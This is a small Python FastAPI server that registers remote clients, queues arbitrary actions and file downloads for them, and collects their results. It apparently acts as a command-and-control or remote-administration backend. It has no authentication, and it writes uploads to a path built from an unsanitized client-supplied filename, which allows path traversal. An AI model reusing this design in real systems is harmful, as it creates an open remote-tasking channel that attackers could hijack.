from fastapi import FastAPI, UploadFile, File, Form
import os
import time

app = FastAPI()

clients = {}
tasks = {}
results = {}

UPLOAD_DIR = "uploads"
os.makedirs(UPLOAD_DIR, exist_ok=True)

@app.get("/")
def home():
    return {"status": "running"}

# Register client
@app.post("/register")
def register(system_id: str = Form(...)):
    clients[system_id] = time.time()
    return {"status": "ok"}

# Get online clients
@app.get("/clients")
def get_clients():
    now = time.time()
    return {cid: "online" for cid, t in clients.items() if now - t < 15}

# Upload file
@app.post("/upload")
async def upload(system_id: str = Form(...), path: str = Form(""), file: UploadFile = File(...)):
    filepath = os.path.join(UPLOAD_DIR, file.filename)

    with open(filepath, "wb") as f:
        f.write(await file.read())

    tasks[system_id] = {
        "action": "download",
        "file": file.filename,
        "path": path
    }

    return {"status": "uploaded"}

# Task send
@app.post("/task")
def create_task(system_id: str = Form(...), action: str = Form(...), path: str = Form("")):
    tasks[system_id] = {"action": action, "path": path}
    return {"status": "task added"}

# Client gets task
@app.get("/task/{system_id}")
def get_task(system_id: str):
    return tasks.pop(system_id, {"action": None})

# Save result
@app.post("/result")
def save_result(system_id: str = Form(...), data: str = Form(...)):
    results[system_id] = data
    return {"status": "saved"}

# Get result
@app.get("/result/{system_id}")
def get_result(system_id: str):
    return results.pop(system_id, {})

# Download file
@app.get("/download/{filename}")
def download(filename: str):
    return {"url": f"/files/{filename}"}
